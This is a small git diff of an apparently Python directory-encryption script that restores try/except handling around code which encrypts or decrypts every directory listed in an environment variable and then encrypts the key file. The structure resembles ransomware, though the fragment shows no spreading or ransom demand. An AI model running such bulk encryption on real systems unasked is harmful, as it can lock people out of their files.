@@ -90,19 +90,19 @@ def main():
             sym_key = f.read()
         return sym_key
 
-    #try:
-    if sys.argv[1] == "encrypt":
-        key = load_key()
-        DirectoryEncryptor(key).crypt_all_dirs("encrypt")
-        encrypt_key(KEY_PATH)
-    else:
-        decrypt_key(KEY_PATH)
-        key = load_key()
-        DirectoryEncryptor(key).crypt_all_dirs("decrypt")
-    """except FileNotFoundError:
+    try:
+        if sys.argv[1] == "encrypt":
+            key = load_key()
+            DirectoryEncryptor(key).crypt_all_dirs("encrypt")
+            encrypt_key(KEY_PATH)
+        else:
+            decrypt_key(KEY_PATH)
+            key = load_key()
+            DirectoryEncryptor(key).crypt_all_dirs("decrypt")
+    except FileNotFoundError:
         print("Could not find a key.")
     except ValueError:
-        print("Files are encrypted or incorrect decryption.")"""
+        print("Files are encrypted or incorrect decryption.")
 
 if __name__ == "__main__":
     target_dir_paths: list[str] = os.getenv("TARGET_DIR_PATHS").split(", ")
